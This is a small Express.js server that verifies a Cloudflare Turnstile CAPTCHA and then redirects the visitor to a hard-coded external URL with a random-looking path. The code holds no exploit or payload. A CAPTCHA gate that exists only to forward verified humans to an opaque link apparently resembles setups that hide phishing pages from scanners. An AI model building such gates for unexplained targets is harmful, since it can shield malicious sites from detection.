const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://seynors.de/o4pZ5o4cyulZXN/';

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/verify', async (req, res) => {
  const token = req.body['cf-turnstile-response'];
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  if (!token) return res.status(400).send('CAPTCHA token missing');

  try {
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        secret: process.env.TURNSTILE_SECRET_KEY,
        response: token,
        remoteip: ip,
      }),
    });

    const data = await verifyRes.json();

    if (data.success) {
      return res.redirect(REDIRECT_URL);
    } else {
      console.error('Turnstile error:', data['error-codes']);
      return res.status(403).send('CAPTCHA failed');
    }
  } catch (error) {
    console.error('Verification error:', error);
    return res.status(500).send('Server error');
  }
});

app.listen(PORT, () => {
  console.log(`App running on port ${PORT}`);
});
